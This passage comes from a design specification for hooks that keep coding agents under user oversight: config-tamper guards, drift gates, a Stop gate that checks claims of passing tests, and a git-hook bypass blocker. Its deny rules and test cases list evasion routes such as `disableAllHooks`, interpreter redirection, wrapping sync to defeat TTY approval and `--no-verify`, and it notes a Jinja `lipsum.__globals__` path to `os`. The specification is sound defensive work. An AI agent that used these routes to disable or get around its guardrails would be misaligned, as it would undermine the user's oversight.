| `.pre-commit-config.yaml` | removing a hook whose id starts `playbook-` or `coding-agent-playbook-` | none | other edits (owned by gate-weakening-guard at Stop) |
| `.coding-agent-playbook.toml` (tomllib key-path diff) | any `[hooks]` / `[hooks.*]` change (including `[hooks.commit_convention] cutover_date`) or `[guardrails]` change | removals from `overlays_enabled`; `adapters_enabled` changes; additions to `[links] allowed_domains`; `[metrics]` loosening (`mode`, `thresholds.*`, `regression.*.max_worsening`, `fail_on_breach`, `strict`, `ignore`/`exclude` additions, `select` narrowing; a change whose direction is unknown counts as loosening); hand edits to `detector_cache`; `[engine] version` | `[project]` and other keys |
| `.coding-agent-playbook.local.toml` (gitignored, deep-merged into Config with no warning, `sources/filesystem.py:351-355`) | any `[hooks]` or `[guardrails]` key, or any key that is an `ask` row above | none | non-policy keys |
| `$(git rev-parse --git-path playbook-hooks)/**` (the `interpreter` pin — rewriting it redirects every hook to an arbitrary interpreter — `machine.json`, `stop/last_green`, `stop.json`, `session.json`) and the user-local trust store (`default_trust_store_path()`, §B.4), including Bash `write_targets` | any write | none | reads |
| `playbook/hooks/**`; `src/*/resources/hooks/**` in engine/overlay repos | none | any edit (executable policy; the user approves). This is the single verdict; §B.2 matches it | none |
| Bash `script`/`expect`/`unbuffer … playbook sync`, or `playbook sync` with stdin from a pipe or redirect | the wrapped or piped sync (it would defeat the TTY-only approval of §B.4; a speed bump) | none | a plain `playbook sync` |
| a file that no longer parses after the edit | none | `ask` | none |

  Loosening the consumer's `[tool.commitizen]` (the commit convention, §F.4) is a pyproject config hunk and belongs to gate-weakening-guard at Stop, not here.

  The reason is always one line: `Guardrail configuration is user-owned; ask the user to change it.` It never tells the agent how to change the config.
- **Implementation.**
  - Builtin handler `control_plane_guard`. It runs on the pinned ≥3.12 interpreter (L4), so `tomllib` is always available; it is imported lazily, only on the TOML-edit branch (a §D.1 branch-local row), so an Edit of a `.py` file or a plain Bash command never loads it.
  - Key paths come from `control_plane.*`; the protected rows come from `protected_paths()`.
  - **Why this guard is the in-session control.** Claude Code watches settings files and applies hook edits to the running session (no startup snapshot), so a removed or edited managed registration takes effect immediately. The PreToolUse deny on structured Edit/Write of the settings files is the in-session control (a boundary); Bash writes are a speed bump; and the `guard_config.json` digest (§D.8.1) means tampering with the policy data needs two coordinated, guarded edits.
  - Ownership split, so nothing is flagged twice:
    - `.git/hooks` and `core.hooksPath` belong to block-precommit-bypass;
    - the lockfile and generated files belong to guard-generated-outputs;
    - pyproject/workflow loosening belongs to gate-weakening-guard.
  - Engine changes (§B.1):
    - `playbook check` and `playbook sync` warn when `local.toml` overrides policy keys;
    - relaxing keys in `local.toml` are ignored unless a user-local trust entry allows them.
  - Regulated overlays get a strict blanket mode plus a rendered managed-settings fragment (`allowManagedHooksOnly`, scripts in a root-owned path). That is the only deployment the agent's own UID cannot tamper with.
- **Budget & failure.** ≤100ms, only on these rare edits. A simulation failure or internal error returns `ask`, never a silent allow.
- **Guards.** Only managed entries and the listed policy keys are inspected, so the user's own hooks and settings are unaffected.
- **Portability.**
  - Claude Code and OpenCode only (the adapters the engine renders).
  - Cursor's `hooks.json` and others are out of scope (SPEC §2.2).
  - JSON/TOML edits through file tools are a boundary; Bash writes are a speed bump.
- **Off-workstation twin.**
  - `playbook sync --check` detects removed or changed managed entries in `.claude/settings.json` (L4): via the pre-commit hook and in CI.
  - `playbook check` prints the `local.toml` policy-override warning.
  - Overlay deployments use managed settings.
- **Tests.**
  - Settings:
    - removing a `playbook-hook` entry: deny;
    - adding the user's own hook: none;
    - `env.PYTHONPATH`: deny;
    - `disableAllHooks: true`: deny;
    - linked worktree: an edit of the **main checkout's** `.claude/settings.local.json` setting `disableAllHooks`: deny;
    - Write `.coding-agent-playbook/hooks/fnmatch.py`: deny;
    - `.mcp.json` adding a server: ask;
    - adding `hooks:` to `.claude/skills/x/SKILL.md` frontmatter: ask; a new `.opencode/plugins/evil.js`: ask.
  - State and trust:
    - `echo /tmp/py > "$(git rev-parse --git-path playbook-hooks)/interpreter"`: deny;
    - Write to the trust store path: deny;
    - `script -q /dev/null playbook sync` and `yes | playbook sync`: deny; `playbook sync`: none.
  - TOML:
    - dropping an overlay from `overlays_enabled`: ask;
    - adding an `allowed_domains` entry: ask;
    - any `[hooks]` edit: deny;
    - `local.toml` with `overlays_enabled = []`: deny;
    - `[project] description`: none;
    - TOML that is broken after the edit: ask.
  - A corrupt `guard_config.json` hash: ask.

#### stop-drift-and-orphan-gate — Stage `drift`: generated outputs drifted or orphaned

`default` · `stop` (coordinator stage 0) · active only when the ledger shows canonical sources, detector inputs or generated outputs were touched, including Bash writes into output dirs · `deny`

- **Behavior.**
  - **Fast path (the only default, about 0.1s, stdlib):**
    - sha256 every lockfile entry against disk; partially-owned entries are compared by their scoped hash (L4);
    - scan `protected.output_dirs` for files carrying the sentinel at its anchored position that are missing from the lockfile: these are **orphans**. The dirs are `.continue/rules`, `.continue/prompts`, `.claude/commands`, `.claude/skills`, `.opencode/command`, plus `.claude/CLAUDE.md` and `AGENTS.md`. Files outside those dirs are never read.
  - On a finding it adds one line to the combined reason: `Playbook drift: <files>. Run playbook validate && playbook sync before finishing.` A repeat on the same fingerprint gives a user note only.
  - **Slow path.** A child process `playbook sync --check` (it imports the renderer). It is enabled only once the engine fixes below land, and then only when canonical or detector inputs changed this session.
- **Implementation.**
  - Builtin handler `stop_drift_and_orphan_gate`.
  - The hash comparison is extracted from `commands/check.py::_format_drift_section` (`check.py:140-155`) into a jinja2-free `lockfile.drift_entries(lockfile, repo_root) -> list[DriftItem]` *(NEW)*. `playbook check` then calls the same helper, so humans and the hook share one definition.
  - Engine fixes come first, because they also fix pre-commit and CI:
    - `commands/sync.py::_run_check` must report the scratch `removed` set as drift. Line 246 (`written, _ = _run_sync(scratch_ctx)`) discards it, so a deleted prompt leaves orphans while `sync --check` prints `No drift detected.` This is L7.
    - The `shutil.copytree(ctx.repo_root, scratch, symlinks=False)` at line 239 must stop following symlinks, use an ignore list (`.git`, `.venv`, `node_modules`, the shared secret-path globs), or render in memory. Today it copies `.env*` and keys into `$TMPDIR` (against SPEC §17.3) and took 11s with a 117MB `.venv`.
  - Keys read: `protected.*`, `sentinel`.
- **Budget & failure.** About 0.1s per active Stop. It fails open with the user note `drift check skipped`.
- **Guards.** It shares the coordinator's one-block-per-fingerprint budget: block once, then note.
- **Portability.**
  - Claude: Stop.
  - OpenCode: evidence-only on `session.idle` (see stop-ci-parity-gate).
  - The check is pure lockfile and git state, so it also runs as `playbook check` (Drift section) for humans.
- **Off-workstation twin.** `playbook sync --check` (pre-commit `playbook-sync-check` / `coding-agent-playbook-sync`, and CI), plus an optional post-checkout/post-merge drift warning stage *(NEW, opt-in)*.
- **Tests.**
  - sync, then hand-edit `.continue/rules/10-x.md`: one drift line.
  - Delete `playbook/prompts/triage.md` without syncing: orphan lines for `.claude/commands/triage.md` and its siblings.
  - No ledger activity: inactive, with zero file reads (spy).
  - Second stop on the same fingerprint: note only.
  - Engine regression test in `tests/cli/test_sync.py`: `sync --check` exits 1 on the orphan case.

#### validate-then-sync-on-canonical-edit — Report `playbook validate` failures in-turn; sync only when enabled

`default` · `post_tool_use` (source-changed branch) · Edit|Write|MultiEdit on `playbook/{rules,prompts,skills,hooks}/**`, `.coding-agent-playbook.toml`, and in engine/overlay repos `src/*/resources/{rules,prompts,skills,hooks}/**` · `context`

- **Behavior.**
  - **What it runs.** `playbook validate`, which is parse-only: `_check_jinja_compiles` calls `env.parse()` (`commands/validate.py:143`) and never renders.
  - **What it returns.** The `✗` lines for the edited file, plus the cross-references the edit broke, as context: `resolve before finishing`. These cover frontmatter schema, `rule()` not in `includes_rules`, rules calling `rule()`, Jinja syntax, unknown `applies_if` facts, `eval_tasks` back-references, PR L self-contained links, and the hook trust contract (L6) for `playbook/hooks/**`.
  - **Why not a block.** It is `context`, not `deny`: transient multi-file states are normal (for example, a prompt written before the rule it includes). The `drift` stage is the hard gate.
  - **Ledger.** It records the touched canonical path for the `drift` stage.
  - **Auto-sync is off by default.** With `[hooks] auto_sync = true` *(shared name — proposed; also read by resync-on-detector-input-change)*, it runs `playbook sync` only when all of these hold:
    - the `SandboxedEnvironment` prerequisite has landed;
    - validate is clean;
    - the edit does not touch a hook artifact, `[hooks]`, `overlays_enabled` or `adapters_enabled`.

    Otherwise it says `ask the user to run playbook sync`. Before sandboxing, auto-sync would execute agent-written templates with no permission prompt: `lipsum.__globals__` reaches `os` through `renderer.py:78` today.
  - **Rendered echo.** Echoing the rendered section is opt-in, `.md.j2` only, at most 30 lines.
- **Implementation.**
  - Builtin handler `validate_then_sync_on_canonical_edit`.
  - It runs **`playbook validate` as a child process** on the pinned interpreter, never an in-process import: `commands.validate` imports jinja2 (verified), which L3 forbids in the dispatcher. That adds about 0.4–0.7s of CLI start to a rare event. Limits nest: child timeout 8s < hook `timeout: 10` ≤ the `post_tool_use` deadline, which the §D.4 formula raises by this hook's 10s when it is enabled (H9's 30s cap holds).
  - Output is filtered by path and id, at most 15 lines.
  - Engine prerequisites:
    - `playbook sync` runs validate first and refuses to render on a failure. Today a rule that fails validate still renders into CLAUDE.md/AGENTS.md (reproduced by the catalog);
    - `playbook validate` runs in engine/overlay roots without a consumer `.coding-agent-playbook.toml`;
    - `SandboxedEnvironment` (L7).
- **Budget & failure.** About 0.4s validate plus process start, per canonical edit. Quality class: fails open with one note.
- **Guards.** A 2s debounce per session, shared with the other source-changed hooks. Never blocks.
- **Portability.**
  - Claude: PostToolUse `additionalContext`.
  - OpenCode: `tool.execute.after`, appending to `output.output`.
  - Others: the pre-commit / CI validate step.
- **Off-workstation twin.**
  - `playbook sync --check` gains validate through the sync-gates-on-validate prerequisite.
  - The `playbook-validate` pre-commit hook (today `stages: [manual]` in `.pre-commit-hooks.yaml`).
  - Engine CI: `tests/cli/test_validate_links.py`.
- **Tests.**
  - Write `playbook/rules/glossary.md` linking `missing.md`: the context contains the `✗` line, and nothing is written under `.claude/`.
  - `auto_sync = true` with a valid edit: the sync child process runs (spy).
  - `auto_sync = true` with an edit to `[hooks]`: no sync, an advice line instead.
  - Two edits within 2s: one validate call.
  - Assert `jinja2` is not in `sys.modules` after dispatch.

#### resync-on-detector-input-change — Surface newly activated rules mid-session (add-only)

`default` · `post_tool_use` (source-changed branch) · Edit|Write on `pyproject.toml`, `requirements*.txt|.in`, `Dockerfile`, `.github/workflows/**`, `.gitlab-ci.yml`; creation of `*.ipynb`; successful Bash `uv add|uv remove|poetry add|poetry remove|pip install` · `context`

- **Behavior.**
  - **Silent unless the detector-relevant set changes.** A tomllib read of the dependency tables, compared against `facts.dependencies` baked at sync, takes about 5ms; an ordinary `[tool.*]` edit stays silent. Dockerfile, CI and notebook inputs are checked by file presence (the `has_dockerfile` / `has_ci` / `has_notebooks` facts).
  - **On a change.** It recomputes facts and evaluates every `applicability` row. Rows that become active and are not in the lockfile's `artifact_id` set are injected as ids plus source paths plus `ask the user to run playbook validate && playbook sync`. The verified case: adding `torch` activates rule `ml-serialization-security` and prompt `security-review`, both `any_ml_stack`.
  - **After sandboxing (L7).** The rendered bodies may be injected (child process `playbook render <id>`, at most 60 lines), so the rule arrives before the risky code is written.
  - **Auto-sync** (`[hooks] auto_sync`) is **add-only**. A change that would deactivate or relax a rule or a security-class hook is reported, never applied, without a human-run sync. Examples: removing `torch` drops ml-unsafe-deserialization-guard; deleting the notebooks drops the data guards.
- **Implementation.**
  - Builtin handler `resync_on_detector_input_change`.
  - It uses `detector.detect()` (`detector.py:288`) and `detector.evaluate_predicate()` (`detector.py:386`) in-process (jinja2-free, verified; `detector` imports `packaging`, so this is a §D.1 branch-local row: imported only on the source-changed branch, and only after the cheap tomllib comparison found a change). It does **not** build a `SyncContext`, because `orchestrator` imports jinja2.
  - Keys read: `facts`, `applicability`, `protected.entries`.
- **Budget & failure.** About 5ms when unchanged; about 0.5s when the applicable set changes. Fails open.
- **Guards.** Once per newly activated id per session. Auto-sync never removes or relaxes anything.
- **Portability.**
  - Claude PostToolUse; OpenCode `tool.execute.after` (success only, matching the exit-0 condition).
  - Elsewhere the `drift` stage and `sync --check` report the missing outputs. `SyncContext.from_repo` re-runs `detect()`, so the twin sees the new facts.
- **Off-workstation twin.** `playbook sync --check` (pre-commit and CI).
- **Tests.**
  - Add `torch>=2` to `[project].dependencies`: the context names `ml-serialization-security`.
  - Edit only `[tool.ruff]`: no `detect()` call (spy), silent.
  - Remove `torch` with `auto_sync = true`: no sync, a report line instead.
  - Bash `uv add torch` reported through `post_tool_use_failure`: silent.

#### session-start-playbook-briefing — Anomaly briefing plus guard heartbeat

`default` · `session_start` · `startup|resume|clear|compact|fork` · `context`

- **Behavior.**
  - **The heartbeat line is always emitted** and is at most 40 characters: `PLAYBOOK-GUARDS: OK <n>` or `GUARDRAILS DEGRADED: <which>`.
    - It is computed from in-process canaries: each enabled `pre_tool_use` guard is run against its synthetic payload from the simulate fixtures, for example "Edit `.claude/CLAUDE.md` must deny".
    - It also checks the `guard_config.json` and launcher hashes against the lockfile.
  - **Everything else appears only on an anomaly**, with a hard 600-character total:
    1. drift (the fast path from stop-drift-and-orphan-gate; never `sync --check` at startup, which copytrees the repo, took 11s with a large `.venv`, copies `.env*` and renders Jinja);
    2. the installed engine version differs from `Lockfile.engine_version`;
    3. detector inputs newer than `Lockfile.rendered_at`;
    4. `.coding-agent-playbook.local.toml` overrides policy keys;
    5. inside a linked worktree: `run every command in <path>; never cd to the main checkout`;
    6. HEAD is on the default branch;
    7. the git identity is empty or a placeholder (reported as `OK`/`placeholder`, never the value);
    8. network / air-gap mode, reported as a category;
    9. an escape hatch set through a settings-file `env` object and therefore ignored (`escape_via_settings_env`, §D.7);
    10. a pending trust approval or a stale `machine.json` (run `playbook sync` in this worktree).
  - **On `compact`** it restates only drift and git/gate state (branch, last gate status for the tree).
  - **Housekeeping.** It runs the TTL sweep of stale per-session state.
- **Implementation.**
  - Builtin handler `session_start_playbook_briefing`, a cold path.
  - It reads the lockfile with `tomllib` (`sources/filesystem.py:340`, `.coding-agent-playbook.lock`) and runs local git (`rev-parse --git-dir/--git-common-dir`, `symbolic-ref`).
  - No `uv run`, no Jinja, no `sync --check`, no toolchain probe; that is left to the reactive toolchain-missing-hint (E.3).
  - **Heartbeat carrier.** When this hook is active, the `claude_code` adapter adds one fixed line to `.claude/CLAUDE.md` (the adapter change and its byte-stability impact are §C.4.2's): `If PLAYBOOK-GUARDS: OK did not appear at session start, tell the user guardrails are not running before risky work.` A broken runtime is then detected by the line's absence. The line is never written into AGENTS.md, where a hookless harness would always "see" a missing heartbeat.
  - **The static model moves into a Hook body.** The static generated-vs-canonical guidance becomes the guard-generated-outputs Hook body, not briefing output.
- **Budget & failure.**
  - ≤300ms, once per start, resume or compaction.
  - Fails open. A dead runtime is caught by the heartbeat line's absence and by `playbook-hook doctor`.
- **Guards.**
  - Silent apart from the heartbeat; 600-character cap.
  - Repo strings are sanitized and quoted.
  - It never injects identity values, guard patterns or internal hostnames.
- **Portability.**
  - Claude: SessionStart stdout / `additionalContext`.
  - OpenCode: `session.created` is fire-and-forget, so the shim injects through `experimental.chat.system.transform`. OpenCode gets no static heartbeat carrier: the adapter may not touch `opencode.json` `instructions` (SPEC §10.6.4), so OpenCode relies on `doctor`.
- **Off-workstation twin.** `playbook check` (Drift and version sections) and `playbook-hook doctor`, both human-run.
- **Tests.**
  - Clean repo: exactly one heartbeat line.
  - Lockfile hash mismatch: a drift line.
  - `local.toml` with `overlays_enabled = []`: a warning.
  - `git worktree add`, then start inside it: the path line.
  - `user.email = you@example.com`: `placeholder`, and the output does not contain the email.
  - Branch name containing an injection-looking phrase: quoted on one line.
  - Corrupt `guard_config.json`: `DEGRADED`.
  - Output always ≤600 characters.

#### eval-task-authoring-lint — Parse and trial-compile edited eval tasks (authoring repos only)

`default` · `post_tool_use` (source-changed branch) · Edit|Write|MultiEdit on `**/eval_tasks/*/task.toml`, `**/eval_tasks/*/setup/pyproject.toml`, and prompts whose `eval_tasks:` frontmatter changed; inert where no `eval_tasks/` dir exists · `context`

- **Behavior.**
  - (1) Parse with `tomllib`. On an escape error it adds `author regex patterns as TOML literal strings (single quotes); \s is an invalid escape in a basic string`.
  - (2) Trial-compile **the one edited task** in-process. This surfaces:
    - unknown check, metric, gate or rubric refs;
    - unbound `expr` identifiers;
    - rubric weight sums;
    - verdict identifiers;
    - `answer_matches` regex compilation;
    - existence of the `setup` files;
    - `prompt_id` resolution;
    - prompt/task `eval_tasks` symmetry.

    Errors go out as context, not a block, since states like a task.toml written before its setup files are normal.
  - (3) On the first successful compile per task per session, it echoes `playbook eval --show <id>`, capped at 25 lines, so the model sees how the engine read gate / rubric / verdict.
  - It **never** calls `playbook eval --run`, which would launch real runners or the LLM judge (network and spend).
- **Implementation.**
  - Builtin handler `eval_task_authoring_lint`.
  - It uses `evals/loader.py::load_eval_task_from_dir` (`:37`), then `evals/validator.py::validate_tasks` (`:46`), which trial-compiles via `evals/task.py::compile_eval_task` (`:207`). All are jinja2-free (verified). Prompts come from `FileSystemArtifactSource.list_prompts` (yaml, no jinja2). These imports are a §D.1 branch-local row, triggered only by an `eval_tasks/*/task.toml` edit, so the `post_tool_use` hot path never loads them.
  - The `--show` echo is a child process: `commands/eval.py::_print_show` (`:482`) lives in a jinja2-importing module.
  - Engine follow-ups move the advisory lints into `playbook validate` warnings, where CI and humans see them:
    - a review-only task (gate is only `file_unchanged`) without a fail-closed `answer_matches`;
    - an `answer_matches` pattern written as a basic string containing backslashes.
- **Budget & failure.** 0.5–1s per task.toml edit, which is rare. Fails open.
- **Guards.** Context only. The `--show` echo is capped and shown once per task per session. Silent outside authoring repos.
- **Portability.** Claude PostToolUse and OpenCode `tool.execute.after`. The validate warnings reach CI.
- **Off-workstation twin.** `playbook validate` → `_check_eval_tasks` (`commands/validate.py:223`), in engine/overlay CI.
- **Tests.**
  - `pattern = "\s"` in a basic string: the TOML hint.
  - An unbound `expr` identifier: a compile-error line.
  - A valid task: an `eval --show` excerpt of 25 lines or fewer, exactly once.
  - Runner and judge entry points are never loaded (spy on `importlib.metadata.entry_points` for `coding_agent_playbook.runners` / `.judges`).

#### guard-eval-fixtures — Protect frozen eval `setup/` fixtures from agent "fixes"

`opt-in` · `pre_tool_use` · Edit|Write|MultiEdit on `**/eval_tasks/*/setup/**`; Bash `ruff --fix|ruff format|black|isort|sed -i` whose path args resolve inside a `setup/` dir · `ask`

- **Behavior.**
  - **Authoring passes.** If the task is being authored (its `task.toml` is untracked at HEAD, or the ledger shows the task dir was created this session), it returns `none`.
  - **Otherwise it asks:** `setup/ is the frozen starting state; find-injected-vuln fixtures are intentionally vulnerable and file_unchanged gates compare against it.`
  - Approval is remembered per task dir per session. Headless: `deny`.
- **Implementation.**
  - Builtin handler `guard_eval_fixtures`: a path match against `eval.fixture_globs` plus a ledger lookup.
  - **The primary fix is configuration and validation, not this hook:**
    - add `[tool.ruff] extend-exclude` for `src/coding_agent_playbook/resources/eval_tasks/*/setup` **plus `force-exclude = true`** (P9; without it, ruff still lints an explicitly passed fixture path), mirroring the mypy `exclude` at `pyproject.toml:150`;
    - add a fixture-integrity check to `playbook validate` and CI (see open questions).
- **Budget & failure.** About 0.05s. Fails open (`none`) on an internal error. This is deliberately not guard-class: the hook is a convenience, and the validate check is the gate.
- **Guards.** Approval is remembered per task dir. Silent outside authoring repos.
- **Portability.** Claude and OpenCode pre-tool (on OpenCode, ask becomes deny with the reason). The validate integrity check covers every harness and humans.
- **Off-workstation twin.** The ruff exclude (with `force-exclude`) plus the validate fixture-integrity check in CI.
- **Tests.**
  - Edit `find-injected-vuln-pytorch-deserial/setup/app/loader.py`: ask.
  - The same edit in a task created this session: none.
  - A second edit after approval: none.
  - Headless: deny.
  - `ruff format src/.../setup/app`: ask.

### E.2 Verify before done

These hooks make "done" mean "the checks pass", not "the agent stopped". stop-ci-parity-gate owns the single Stop coordinator (E.0.4). The rest are stages or companions of it.

#### stop-ci-parity-gate — The Stop coordinator: CI-parity verification, one combined block per tree

`default` · `stop` (the only registered Stop handler; owns stages `lint`, `verify-claim`, `typecheck`, `tests`) · any · `deny`

- **Behavior.**
  - **Skip in about 60ms** when any of these holds:
    - the fingerprint equals the last-green tree or `HEAD^{tree}`;
    - `permission_mode == "plan"` (when the field is present);
    - `PLAYBOOK_GATE=off` is set in the hook env.

    The fingerprint is the §D.5.3 temp-index tree id (pathspec-from-file, per-path literal excludes, a size cap, and an aux stat hash for excluded paths); the user's index is never touched, and secret files are never hashed into the object store.
  - **`lint`.** Runs `ruff check .` and `ruff format --check .`, with no path args (CI parity). Attribution blocks only on **new** findings:
    - a new `(file, code, message)` tuple, ignoring line numbers;
    - a file that became unformatted;

    both measured against a baseline computed once per `HEAD^{tree}`. The baseline comes from the same argv run over a `git archive HEAD` export in a temp dir (secret globs excluded) and is cached in state. Legacy red therefore never fails every turn.
  - **`verify-claim`.** Fires when `last_assistant_message` matches a `claim_patterns` entry ("tests pass", "mypy clean", "green", "ready to merge", …) **and** the ledger has no green run of any `verify_commands` entry after the last `.py` edit. A green run is a `post_tool_use` event, not `_failure`. It contributes `You said "<claim>"; no passing <cmd> since your last edit. Run it and report the result.`
  - **`typecheck` / `tests`** (opt-in, and only with a user-local trust entry stored outside the repo). They run `python -m mypy` and `python -m pytest -q`, again with no path args. A hook that runs pytest executes agent-written `conftest.py` without a permission prompt, which is an edit-to-exec escalation; hence the trust requirement.
    - mypy is skipped when `[tool.mypy] plugins` differ from HEAD.
    - pytest runs only when completion is claimed.
    - Targeted mode (`tests_scope = "touched"`) passes `--no-cov`, because `--cov-fail-under=80` in addopts (`pyproject.toml:175`) fails any subset.
    - Coverage is §F's `coverage` stage. When both stages are enabled, §F's shared suite run serves both, so the suite runs once per fingerprint.
  - **Output.** One `{decision: "block", reason}` per fingerprint, at most 40 lines, stage-labeled, with trimmed diagnostics. A missing toolchain yields one line of advice for the **user**, not a command for the agent.
  - **Green.** A green run records the tree id. The first green per fingerprint shows the user `verified locally (<stages>); the CI matrix is authoritative`.
- **Implementation.**
  - Builtin handler `stop_ci_parity_gate`, a cold path.
  - **The stage list is baked into `stop_gate.stages` at sync.** It is derived from detector `dev_tools`, the consumer's `repo: local` pre-commit hooks and `[hooks.stop-ci-parity-gate]` (`stages`, `verify_commands`, `max_blocks`, `budget_s`; §B.1). Each stage record is machine-independent (logical tool + args); the absolute tool path and stat signature are pinned per worktree in `machine.json` (§D.8.3). The `uv run --frozen --no-sync <tool>` form is used only where no path can be pinned. The gate never reads a command at run time from an agent-editable file.
  - Per-stage timeouts; the Stop deadline and the registration timeout follow the §D.4 formula (`budget_s` + the enabled execution stages' `timeout_s`, registration = deadline + 2s).
  - The block is emitted as JSON on exit 0, **never exit 2**. On Stop, an exit 2 with a "No such file or directory" stderr is treated as non-blocking, and `onFailure` has no effect on Stop (research verification).
  - The tree id doubles as an advisory cache key for git-commit-push-policy-guard (E.4).
  - Keys read: `stop_gate.*`.
- **Budget & failure.**
  - Budget: about 60ms on an unchanged tree; ≤3s for the default stages (ruff measured 0.03–0.04s; metrics about 2.4s per file). Execution stages take tens of seconds.
  - A stage timeout or crash fails open but always emits `NOT verified`.
- **Guards.**
  - **Block budget.** Within one stop chain, at most `max_blocks = 2` blocks, kept in engine state. On Claude the chain signal is `stop_hook_active`; the chain resets when a stop is allowed.
  - **Fingerprint rule.** A block needs a fingerprint different from the last blocked one. A repeat on an unchanged tree is allowed, with the user note `gate RED at <stage> — NOT verified`. Red is never presented as green.
  - Claude's own continuation cap (8, `CLAUDE_CODE_STOP_HOOK_BLOCK_CAP`) is never reached.
  - It skips unchanged trees, plan mode and the kill switch, and uses baseline-diff attribution.
- **Portability.**
  - Claude: Stop block.
  - OpenCode: **evidence-only**. `session.idle` arrives through the fire-and-forget `event` hook and cannot block or re-enter the loop (#16626, #12472 open). The shim runs the coordinator on `session.idle`; the dispatcher returns the combined result on stdout (§D.5.6) and the shim's `carry` injects `gate RED at <stage> — NOT verified` into the next request via `experimental.chat.system.transform` (§C.3.6).
  - Every harness gets the Hook body's AGENTS.md line: `run <stages> before claiming done`.
- **Off-workstation twin.**
  - The consumer's CI is authoritative. Here, `.github/workflows/ci.yml` runs `ruff check .`, `ruff format --check .`, `mypy` and `pytest -q` on 3.12 and 3.13.
  - An optional pre-push stage *(NEW, opt-in)* runs the default stages over `@{push}..HEAD`.
- **Tests** (`FakeStageRunner` plus the autouse `subprocess.run`/`shutil.which` stub):
  - Unchanged tree: zero tool calls.
  - A new ruff error: a single block.
  - Only a pre-existing error: none.
  - Second stop on the same tree: none, plus `NOT verified`.
  - `"all tests pass"` with an empty ledger: block.
  - Untrusted repo: mypy/pytest never invoked.
  - Trusted repo with a mypy plugin added versus HEAD: mypy skipped.
  - Three failing stages: exactly one combined reason.
  - A missing launcher on Stop: the gate fails open (no false block).

#### clean-code-metrics-nonregression — Stage `quality-metrics`: static non-regression at Stop, mirroring the repo's metrics gate

`default` (post-edit companion `opt-in`) · `stop` (stage 2); companion `post_tool_use` on Edit|Write|NotebookEdit of `**/*.py` (handler `clean_code_metrics_nonregression:post_edit`, bound through `handlers`) · active when `.py` files were touched (ledger ∪ `git diff --name-only HEAD` ∪ untracked), excluding `eval.fixture_globs` · `deny` / `context`

- **Behavior.**
  - **What it runs** (addendum D-Q1). The existing `playbook metrics` static gate over the touched files, with `--baseline git:HEAD`: CC, WMC, LCOM4, DIT and CBO≈, plus MI and `file_sloc` when radon is installed, **plus** §F.2's `ruff_violations` metric restricted to its `quality` family (C901, PLR0911, PLR0912, PLR0913, PLR0915; counts per touched file, candidate vs baseline). It executes **no repo code** (ruff is a pinned consumer-toolchain subprocess).
  - **Severity mirrors the repo's own gate.** Fail-level findings join the combined block only when **both** hold:
    - `.pre-commit-config.yaml` declares `playbook-metrics` or `coding-agent-playbook-metrics` (the `precommit` snapshot ∪ a live regex scan);
    - `[metrics] fail_on_breach` is true.

    In that case the commit would fail anyway, so the agent that caused the finding fixes it while it still has the context. Otherwise each finding is one context line.
  - **Scopes.** Existing scopes are judged on non-regression. New functions and files get absolute bands only when configured, through `[metrics] thresholds` or an overlay; the budgets come from the user's global CLAUDE.md, not a shipped rule, and the engine itself has functions with CC above 10 and files over 500 lines.
  - **Post-edit companion** (opt-in; addendum D-Q1). Context only. It adds no metric code: it contributes the `quality` bucket (C901, PLR0911, PLR0912, PLR0913, PLR0915; thresholds from `[metrics.ruff_violations] config` (§F.2.1, the one source shared with the Stop stage and the twins), rendered at sync as per-invocation `--config` overrides and omitted where the project itself selects the code) to the **single** §E.3 D1 ruff call, changed lines only, within the shared 8-line cap. PLR1702 (nesting) is preview-only in ruff 0.15.10 and opt-in through a separate per-invocation `--preview --select PLR1702` call.
- **Implementation.**
  - Builtin handler `clean_code_metrics_nonregression`. It runs in-process through `evaluators.metrics_gate` (a §D.1 branch-local row; jinja2-free).
  - **It must force static-only.** `commands/metrics.py::run` (`:574`) computes `run_tests = bool(args.run_tests) or config.run_tests`, so a repo with `[metrics] run_tests = true` would execute its test suite from the hook without trust. The stage therefore calls `run_metrics_gate` (§F.0.3) with `run_tests=False`. The CLI output stays unchanged.
  - The companion is a bucket in §E.3's shared D1 call (`ruff_lint_feedback`), not a metrics import.
  - It reads `[metrics]` **live**, for parity with the pre-commit hook; this is the documented exception to E.0.2. Loosening it is caught by control-plane-guard.
  - Input hardening:
    - file size is capped before parsing;
    - `SyntaxError` / `RecursionError` produce a context line, never a crash (`_safe_measure`, `:281`, catches only `SyntaxError` on the baseline side).
- **Budget & failure.** 0.1–1s at Stop when `.py` files were touched (§F.0.3 measured 0.09s import + 0.013s per file; plus one ruff subprocess per side); zero otherwise. The companion adds about 0 per edit (shared D1). Quality class: fails open with one line.
- **Guards.** It shares the coordinator's block budget. It is never stricter than the repo's pre-commit configuration. Companion messages are deduplicated per symbol.
- **Portability.** The input is git state, so any stop-like event works. OpenCode: evidence-only, like the coordinator.
- **Off-workstation twin.** The `playbook-metrics` / `coding-agent-playbook-metrics` pre-commit hooks (`playbook metrics --baseline git:HEAD`), plus CI `playbook metrics --baseline git:<merge-base>` (§F).
- **Tests.**
  - Grow a function's CC versus HEAD with the metrics pre-commit hook configured: one block line naming `scope_key`, the metric and `baseline → candidate`.
  - The same change without the hook: a context line.
  - A new function over the configured `PLR0915` statement limit: silent with no `ruff_violations` selection; a context line (or a deny line under the metrics pre-commit hook) when the quality family is selected.
  - Post-edit companion: the D1 argv carries `--extend-select C901,PLR0911,PLR0912,PLR0913,PLR0915` and the `--config lint.mccabe.max-complexity=…` override; no override when the project selects `C901`.
  - `[metrics] run_tests = true`: no test subprocess (spy).
  - A pathologically nested file: a context line, no crash.

#### block-precommit-bypass — Block git-hook bypass

`default` · `pre_tool_use` (bash branch) · Bash segments whose argv0 is `git` or `pre-commit`, or that carry the env prefixes `SKIP=`, `PRE_COMMIT_ALLOW_NO_CONFIG`, `GIT_CONFIG_COUNT/KEY_n/VALUE_n` or `GIT_CONFIG_PARAMETERS`; `rm`/`mv`/`chmod`/redirections onto `.git/hooks/**`; file-tool edits to `.git/hooks/**` and to `core.hooksPath` in `.git/config` · `deny` (`ask` for plumbing)

- **Behavior.** Active only when the repo declares a playbook pre-commit hook: any id starting `playbook-` or `coding-agent-playbook-`. Today those ids are `playbook-sync-check`, `playbook-validate` and `playbook-metrics` (`.pre-commit-hooks.yaml`), and `coding-agent-playbook-sync` and `coding-agent-playbook-metrics` (`config.yaml.j2`), plus the new ids from E.4 and §F (e.g. `playbook-secrets`, `playbook-commit-msg`).
  - **Denied:**
    - `--no-verify` on commit, push, merge, rebase, cherry-pick or am;
    - `-n` on `git commit` only, including combined short flags (on push it is dry-run, on merge `--no-stat`);
